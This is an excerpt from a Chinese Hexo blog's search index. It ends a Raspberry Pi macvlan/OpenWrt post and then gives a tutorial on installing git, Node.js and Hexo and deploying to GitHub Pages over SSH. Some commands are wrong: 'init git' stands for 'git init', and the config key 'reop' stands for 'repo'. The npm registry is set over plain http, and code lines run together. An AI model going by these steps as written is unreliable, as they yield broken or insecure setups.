/etc/network/interfaces # 编辑文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>向文件末尾添加</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auto eth0iface eth0 inet manualauto macvlaniface macvlan inet static  address 192.168.0.90  netmask 255.255.255.0  gateway 192.168.0.1  dns-nameservers 192.168.0.1  pre-up ip link add macvlan link eth0 type macvlan mode bridge  post-down ip link del macvlan link eth0 type macvlan mode bridge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>修改后重启树莓派，之后树莓派的局域网 IP 地址将会固定为 <code>/etc/network/interfaces</code>  文件中 <code>address</code>  参数中的地址.</li></ul><h1 id="鸣谢摘抄"><a class="markdownIt-Anchor" href="#鸣谢摘抄">#</a> 鸣谢 (摘抄)</h1><p><a href="https://mlapp.cn/376.html" title="在Docker 中运行 OpenWrt 旁路网关">在 Docker 中运行 OpenWrt 旁路网关</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
            <tag> docker </tag>
            
            <tag> openwrt </tag>
            
            <tag> router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Hexo 程序部署博客到githubpage上</title>
      <link href="/ug/133537/"/>
      <url>/ug/133537/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a class="markdownIt-Anchor" href="#环境">#</a> 环境</h1><p>Hexo 程序使用 node.js 程序编写，因此需要现在环境机上部署 node.js，git 只用来推送。</p><blockquote><p><strong>什么是 Node.js</strong>：一个运行 javascript (JS) 的环境。Hexo 是一个 javascript (JS) 语言的程序。一般 JS 运行在浏览器中，但是也有一种非浏览器环境也可以运行 JS。这个环境是 Node.js</p></blockquote><blockquote><p><strong>什么是 Git</strong>：一个版本控制软件。Hexo 博客源码由纯文本构成，管理纯文本项目的最好办法之一就是使用 Git。还记得 word 里面的历史记录和版本回退功能么？简单的来说，Git 就提供了类似功能，只不过更强大。</p></blockquote><blockquote><p>本文章使用 fedora 系 linux 操作。</p></blockquote><h2 id="安装-git"><a class="markdownIt-Anchor" href="#安装-git">#</a> 安装 git</h2><p>使用 yum 指令进行安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">suyum install git-core # 坏习惯，请减少使用root用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看是否安装成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[root@localhost ~]# git --versiongit version 1.8.3.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="安装-nodejs"><a class="markdownIt-Anchor" href="#安装-nodejs">#</a> 安装 node.js</h2><p>直接 yum 一把梭</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum install nodejs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后查看版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[root@localhost ~]# node -vv16.14.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>顺便看看 npm 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[root@localhost ~]# npm -v8.5.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="配置本体"><a class="markdownIt-Anchor" href="#配置本体">#</a> 配置本体</h1><h2 id="hexo"><a class="markdownIt-Anchor" href="#hexo">#</a> hexo</h2><p>如果你没有使用加速等工具的话，这里建议将 npm 源改到淘宝：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm config set registry http://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 npm 指令安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看看安装好了没：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[root@localhost ~]# hexo -vhexo-cli: 4.3.0os: linux 3.10.0-1160.31.1.el7.x86_64 CentOS Linux 7 (Core)node: 16.14.2...ngtcp2: 0.1.0-DEVnghttp3: 0.1.0-DEV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装server"><a class="markdownIt-Anchor" href="#安装server">#</a> 安装 server</h2><p>如果你想在本地预览博客的话，可以安装下。其实装不装都无所谓。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install hexo hexo-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装推送插件"><a class="markdownIt-Anchor" href="#安装推送插件">#</a> 安装推送插件</h2><p>这个推送插件是后面要推送到 <code>github page</code>  上要使用的插件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建博客"><a class="markdownIt-Anchor" href="#创建博客">#</a> 创建博客</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo init [你的博客名字]cd [你的博客名字]npm install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>如果你已经备份过想要还原，则只需要做到这一步就已经可以了。但是如果想要推送还需要再看下面的配置 git 项。</p></blockquote><h1 id="本地预览博客"><a class="markdownIt-Anchor" href="#本地预览博客">#</a> 本地预览博客</h1><p>上面已经生成好了基本博客，可以使用 <code>ls</code>  命令查看下是否正确生成了文件<br>下面是 hexo 博客的基本结构。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">. ├── _config.yml # 网站配置信息 ├── package.json # 应用程序信息 ├── scaffolds # 模板文件夹 ├── node_modules # 生成博客后编译出来的文件。主要看这个是否生成成功了。 ├── source # 存放用户资源 |   ├── _drafts |   └── _posts └── themes # 主题文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果确认没什么问题便可以进行生成步骤了。</p><ol><li>测试本地生成博客</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 生成一篇文章，注意要在blog的目录下。hexo new "文章名"# 生成静态网页hexo g# 打开本地服务器hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时你可以打开  <code>[博客地址]:4000</code>  来查看效果了。<br>如果确认没问题，便可以继续操作。</p><h1 id="备份还原"><a class="markdownIt-Anchor" href="#备份还原">#</a> 备份还原</h1><p>博客部署完成后或是以后工作中难免需要更换环境，这里也简单说一下备份还原的流程。</p><h2 id="本地备份还原"><a class="markdownIt-Anchor" href="#本地备份还原">#</a> 本地备份还原</h2><p>本地备份还原是对主要文件自行压缩拷贝后导出，然后覆盖进行还原</p><blockquote><p>需要备份的文件列表如下</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.|-- .gitignore|-- _config.yml|-- package-lock.json|-- package.json|-- scaffolds|-- source`-- themes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将这些文件考出来后则备份完成。</p><h2 id="可能会出现的问题"><a class="markdownIt-Anchor" href="#可能会出现的问题">#</a> 可能会出现的问题</h2><p>如果当你完成还原，进行 <code>hexo g</code>  命令提示如下错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@LAPTOP-N4RDFRJ0:/mnt/d/Program/hexo/blog# npm install --save bulma-stylusnpm ERR! code FETCH_ERRORnpm ERR! errno FETCH_ERRORnpm ERR! invalid json response body at https://registry.npmjs.org/browserslist reason: Unexpected end of JSON inputnpm ERR! A complete log of this run can be found in:npm ERR!     /root/.npm/_logs/2022-08-23T09_22_43_977Z-debug.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行这条命令即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm cache clean --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="配置远端"><a class="markdownIt-Anchor" href="#配置远端">#</a> 配置远端</h1><p>我将博客部署到了 github 上，所以你要先去 github.com 上注册一个账户。并创建一个仓库。</p><h2 id="初始化-git"><a class="markdownIt-Anchor" href="#初始化-git">#</a> 初始化 git</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">init git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果提示 <code>Couldn't find an alternative telinit implementation to spawn.</code>  不用管，直接下一步。</p></blockquote><h2 id="配置-ssh"><a class="markdownIt-Anchor" href="#配置-ssh">#</a> 配置 ssh</h2><ol><li>配置登录信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">git config --global user.name "你的git用户名"git config --global user.email "你的git登录邮箱"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>生成 ssh keygen</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa -C "你的git登录邮箱"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果弹出了很多内容，直接进行一个回车跳过。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase):Enter same passphrase again:... // 直接回车跳过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>复制密钥</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vi /root/.ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>将里面显示的所有内容复制。</p></blockquote><ol start="4"><li>登录 github</li></ol><ul><li>头像</li><li>Settings</li><li>SSH and GPG keys</li><li>New SSH key</li><li>将复制的内容粘贴到 Keys 框里</li><li>Add SSH key</li></ul><ol start="5"><li>测试链接是否成功</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[root@localhost ~]# ssh -T git@github.comHi maxshiro! You've successfully authenticated, but GitHub does not provide shell access.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="配置推送"><a class="markdownIt-Anchor" href="#配置推送">#</a> 配置推送</h1><p>配置完 git 之后便可以配置 hexo 博客的推送地址了，下面以我的为例。</p><ol><li>首先 cd 到当前目录</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd blog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>编辑配置文件</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vi _config.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>移动到 deploy 天机如下内容</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deploy:    type: git    reop: git@github.com:maxshiro/maxshiro.github.io.git #这个地址可以到你的repo那里获得。    branch: main #这个branch就是仓库的默认目录了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="推送博客"><a class="markdownIt-Anchor" href="#推送博客">#</a> 推送博客</h1><p>已经测试并生成过博客了，所以可以直接推送。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 清理之前生成的文件hexo clean# 生成静态网页hexo g# 推送到github repohexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="结语"><a class="markdownIt-Anchor" href="#结语">#</a> 结语</h1><p>此时你已经完成了 hexo 博客的基本配置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> guide </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
